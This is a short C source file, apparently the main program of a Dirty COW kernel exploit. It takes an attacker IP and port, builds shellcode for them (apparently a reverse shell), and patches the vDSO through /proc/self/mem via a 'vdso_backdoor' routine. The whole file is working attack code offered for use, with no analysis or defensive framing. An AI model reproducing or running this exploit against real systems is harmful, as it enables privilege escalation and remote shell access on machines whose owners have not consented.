#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>

#include "exploit.h"
#include "dirtycow.h"
#include "vdso_backdoor.h"
#include "unit.h"

int main(int argc, char *argv[]) {
    unsigned int shellcode_size;
    unsigned char *shellcode;

    if (argc != 3) {
        printf("usage: %s ip port\n", argv[0]);
        fflush(stdout);
        _exit(0);
    }

    struct in_addr ip;
    if(!inet_aton(argv[1], &ip)) {
        warn("error ip");
    }

    unsigned short port = htons(atoi(argv[2]));

    build_shellcode(&shellcode, &shellcode_size, ip.s_addr, port);

    struct mem_vec * vecs;
    unsigned int size;
    get_vdso_patch_vec(&vecs, &size, shellcode, shellcode_size);

    exploit(vecs, size, PROC_SELF_MEM);
}